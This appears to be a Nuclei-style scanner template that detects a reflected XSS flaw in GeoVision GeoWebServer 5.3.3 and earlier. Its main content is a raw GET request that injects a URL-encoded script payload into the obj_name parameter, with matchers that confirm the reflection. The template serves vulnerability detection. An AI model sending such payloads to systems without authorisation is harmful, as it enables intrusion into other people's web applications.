id: geowebserver-xss
info:
  author: madrobot
  description: GEOVISION GEOWEBSERVER =< 5.3.3 are vulnerable to several XSS / HTML
    Injection / Local File Include / XML Injection / Code execution vectors. The application
    fails to properly sanitize user requests.
  name: GeoVision Geowebserver 5.3.3 - XSS
  reference:
  - https://packetstormsecurity.com/files/163860/geovisiongws533-lfixssxsrfexec.txt
  severity: medium
  tags: geowebserver,xss
requests:
- matchers:
  - part: body
    regex:
    - </script><script>alert(document.domain)</script>
    type: regex
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  raw:
  - 'GET /Visitor/bin/WebStrings.srf?file=&obj_name=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
    HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
